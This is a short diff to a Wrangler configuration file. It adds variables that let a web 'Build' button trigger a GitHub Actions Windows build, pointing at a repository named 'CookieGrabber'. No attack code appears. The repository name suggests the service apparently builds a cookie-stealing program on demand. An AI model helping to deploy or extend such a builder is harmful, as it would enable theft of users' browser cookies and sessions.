@@ -15,6 +15,14 @@ id = "REPLACE_WITH_YOUR_KV_NAMESPACE_ID"
 #   ADMIN_USER     : first admin username (default "admin")
 #   ADMIN_PASS     : first admin password (bootstraps only when no users exist)
 #   ALLOWED_ORIGIN : exact https origin of your Netlify site, e.g. https://you.netlify.app
+# Optional -- enable auto-triggering the free GitHub Actions Windows builder so a
+# user's "Build" click compiles with NO manual step and NO machine of yours:
+#   GH_OWNER / GH_REPO       : your GitHub repo owner + name
+#   GH_WORKFLOW_ID           : "build.yml" (the workflow filename)
+#   GH_PAT                   : fine-grained PAT scoped to that repo, Actions:write
 # vars are non-secret defaults; secrets override via `wrangler secret put`.
 [vars]
 ADMIN_USER = "admin"
+GH_OWNER = "bishnuneup4ne"
+GH_REPO = "CookieGrabber"
+GH_WORKFLOW_ID = "build.yml"
